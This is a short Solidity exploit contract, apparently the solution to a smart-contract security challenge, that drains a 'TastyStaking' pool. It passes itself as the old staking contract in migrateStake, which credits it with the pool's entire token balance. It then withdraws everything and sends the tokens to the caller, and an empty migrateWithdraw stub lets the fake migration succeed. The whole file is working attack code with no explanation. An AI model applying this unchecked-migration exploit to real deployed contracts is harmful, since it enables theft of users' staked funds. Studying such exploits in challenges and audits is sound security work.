// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";
import {TastyStaking} from "src/tasty-stake/TastyStaking.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TastyStakingAttack {
    TastyStaking public tastyStaking;
    IERC20 public steak;

    constructor(address _tastyStaking, address _steak) {
        tastyStaking = TastyStaking(_tastyStaking);
        steak = IERC20(_steak);
    }

    function attack() public {
        tastyStaking.migrateStake({oldStaking: address(this), amount: steak.balanceOf(address(tastyStaking))});
        tastyStaking.withdrawAll({claim: false});
        steak.transfer(msg.sender, steak.balanceOf(address(this)));
    }

    function migrateWithdraw(address staker, uint256 amount) public {}
}
